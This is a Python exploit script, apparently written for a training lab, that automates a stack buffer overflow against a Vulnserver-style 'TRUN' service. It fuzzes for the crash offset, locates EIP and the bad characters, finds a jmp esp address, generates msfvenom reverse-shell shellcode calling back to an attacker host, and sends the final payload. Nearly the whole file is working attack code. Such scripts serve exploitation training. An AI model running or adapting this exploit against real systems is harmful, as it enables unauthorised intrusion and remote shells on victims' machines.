#!/usr/bin/env python3
# Author: Onur Göğebakan

import socket
import subprocess
from time import sleep


# Step 1 - Find  approximate value of offset

ip = '10.10.160.80'
port = 9999
lhost = '10.10.10.227'
lport = 4444
prefix = 'TRUN /.:/'
timeout = 5
offset = 0
buffer = 'A' * 100
padding = "\x90" * 16


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((ip, port))
		s.recv(1024)
		print('Buffer size:', len(buffer))
		s.send((prefix + buffer).encode())
		s.recv(1024)
		s.close()
		buffer += 'A' * 100
		sleep(1)
	except:
		offset = len(buffer)
		print('Crashed at:', len(buffer))
		break

input('Please restart Immunity Debugger')

# Step 2 - Create & and send pattern
command = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ' + str(offset+100)
process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
pattern, error = process.communicate()

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send((prefix + pattern.decode()).encode())
	s.close()
except:
	print("Can't connect")
	pass

eip = input('Type EIP adress: ')


# Step 3 - Find exact offset value
command = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q ' + eip
process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
offset, error = process.communicate()
offset = int(offset.decode().split(' ')[-1].strip())

print('Offset:', offset)
input('Restart Immunity Debugger')


# Step 4 - Find bad characters
badchars = []

def CreateFileCharList(): # Create char list from file
	f = open('badfile.txt', 'r')
	temp_badlist = [char for line in f.readlines() for char in line[8:].strip()[:23].split(' ')]
	f.close()
	return temp_badlist


def CreateBadCharList(baddies=[]):
	temp_badlist = []
	for char in range(1, 256):
		tempbyte = '{:02x}'.format(char)
		if tempbyte in baddies: continue
		temp_badlist.append(tempbyte)

	return temp_badlist


def CreateBadCharPayload(baddies=[]):
	temp_badlist = []
	for char in range(1, 256):
		tempbyte = '{:02x}'.format(char)
		if tempbyte in baddies: continue
		temp_badlist.append(char)

	print('New badchar payload created.')
	return bytearray(temp_badlist)



def FindBadChars():
	filechars_list = CreateFileCharList() 
	badchars_list = CreateBadCharList(badchars)
	anyBaddies = False
	recentBad = True
	for bchar, fchar in zip(badchars_list, filechars_list):
		if fchar.lower() != bchar and recentBad:
			badchars.append(bchar)
			anyBaddies = True # used for check if no more bad chars remain
			recentBad = False # for the let consecutive bad chars to next round
		else:
			recentBad = True
	print('Bad characters: ' + ','.join(badchars))
	return anyBaddies


while True:

	try:
		badchar_payload = CreateBadCharPayload(badchars)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.send(bytes(prefix + (offset) * 'A' + 'BBBB', 'latin-1') + badchar_payload)
		s.close()
		input('ESP -> Follow in Dump -> Copy till FF -> Paste into badfile.txt -> Press Enter')
		if FindBadChars(): 
			rec = input('There may still be bad characters. If you keep continue restart Immunity Debugger and press enter. Or type 0 to skip: ')
			if rec == '0': break
		else: # all the bad chars cleared
			print('All the bad characters cleared')
			break
	except Exception as e: 
		print(e)


# Step 5 - Find jmp point
print('Paste this command to Immunity debugger -> Switch to Log data window -> Copy an address')
print('!mona jmp -r esp -cpb "\\x00\\x' + '\\x'.join(badchars) + '"')

jmp_address = input('Adress: ').lower()
arr = [jmp_address[6:8], jmp_address[4:6], jmp_address[2:4], jmp_address[0:2]]
jmp_address = '\\x' + '\\x'. join(arr)

jmp_address = jmp_address.encode().decode('unicode_escape')


# Step 6 - Generate Payload
print('Generating payload...')
command = 'msfvenom -p windows/shell_reverse_tcp LHOST=' + lhost + ' LPORT=' + str(lport) + ' EXITFUNC=thread -b "\\x00\\x' + '\\x'.join(badchars) + '"' + ' -f c'
process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
output, error = process.communicate()
output = output.decode()


payload = ''
for i in range(len(output)-4):
	if output[i:i+2] == '\\x':
		payload += output[i:i+4]
		i += 4
payload = payload.encode().decode('unicode_escape')

input('Ready your listener and make sure Immunity debugger is running')

# Step 7 - Send payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	s.send(bytes(prefix + (offset) * 'A' + jmp_address + padding + payload, 'latin-1'))
	print('done')
except Exception as e: 
	print(e)
	
